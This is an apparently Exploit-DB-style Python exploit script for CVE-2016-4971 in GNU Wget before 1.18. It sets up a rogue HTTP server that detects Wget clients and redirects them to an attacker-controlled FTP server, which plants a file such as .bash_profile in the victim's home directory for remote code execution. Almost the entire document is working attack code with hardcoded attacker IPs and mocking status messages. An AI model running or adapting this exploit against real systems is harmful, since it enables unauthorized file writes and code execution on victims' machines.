# Exploit Title: GNU Wget < 1.18 - Arbitrary File Upload / Remote Code Execution (2)
# Original Exploit Author: Dawid Golunski
# Exploit Author: liewehacksie
# Version: GNU Wget < 1.18
# CVE: CVE-2016-4971

import http.server
import socketserver
import socket
import sys

class wgetExploit(http.server.SimpleHTTPRequestHandler):

   def do_GET(self):
       # This takes care of sending .wgetrc/.bash_profile/$file

       print("We have a volunteer requesting " + self.path + " by GET :)\n")
       if "Wget" not in self.headers.get('User-Agent'):
          print("But it's not a Wget :( \n")
          self.send_response(200)
          self.end_headers()
          self.wfile.write("Nothing to see here...")
          return

       self.send_response(301)
       print("Uploading " + str(FILE) + "via ftp redirect vuln. It should land in /home/ \n")
       new_path = 'ftp://anonymous@{}:{}/{}'.format(FTP_HOST, FTP_PORT, FILE)

       print("Sending redirect to %s \n"%(new_path))
       self.send_header('Location', new_path)
       self.end_headers()


HTTP_LISTEN_IP = '192.168.72.2'
HTTP_LISTEN_PORT = 80
FTP_HOST = '192.168.72.4'
FTP_PORT = 2121
FILE = '.bash_profile'

handler = socketserver.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)

print("Ready? Is your FTP server running?")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex((FTP_HOST, FTP_PORT))
if result == 0:
   print("FTP found open on %s:%s. Let's go then\n" % (FTP_HOST, FTP_PORT))
else:
   print("FTP is down :( Exiting.")
   exit(1)

print("Serving wget exploit on port %s...\n\n" % HTTP_LISTEN_PORT)

handler.serve_forever()